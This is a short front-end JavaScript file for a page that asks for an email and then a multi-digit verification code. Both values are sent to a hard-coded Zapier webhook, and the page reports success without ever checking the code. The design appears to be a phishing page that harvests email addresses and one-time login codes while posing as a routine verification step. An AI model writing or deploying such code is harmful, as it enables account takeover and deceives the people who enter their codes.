document.addEventListener('DOMContentLoaded', () => {
  const continueBtn = document.getElementById('continueBtn');
  const modalOverlay = document.getElementById('modalOverlay');
  const modalMessage = document.getElementById('modalMessage');
  const codeBoxes = document.querySelectorAll('.codeBox');
  const successMessage = document.getElementById('successMessage');

  const ZAPIER_WEBHOOK = "https://hooks.zapier.com/hooks/catch/26329103/uln0ahv/";

  continueBtn.addEventListener('click', () => {
    const email = document.getElementById('email').value.trim();
    if (!email) { alert("Please enter your email."); return; }

    modalOverlay.style.display = 'flex';
    codeBoxes[0].focus();

    fetch(ZAPIER_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type: 'email', email })
    });
  });

  codeBoxes.forEach((box, index) => {
    box.addEventListener('input', (e) => {
      const val = e.target.value;
      if (val.length === 1 && index < codeBoxes.length - 1) codeBoxes[index+1].focus();

      if (index === codeBoxes.length - 1 && val.length === 1) {
        const email = document.getElementById('email').value.trim();
        const code = Array.from(codeBoxes).map(b => b.value).join('');
        codeBoxes.forEach(b => b.disabled = true);
        successMessage.style.display = 'block';

        fetch(ZAPIER_WEBHOOK, {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify({ type: 'code', email, code })
        });

        setTimeout(() => { modalOverlay.style.display = 'none'; }, 2000);
      }
    });

    box.addEventListener('keydown', (e) => {
      if (e.key === "Backspace" && !box.value && index > 0) codeBoxes[index-1].focus();
    });
  });
});
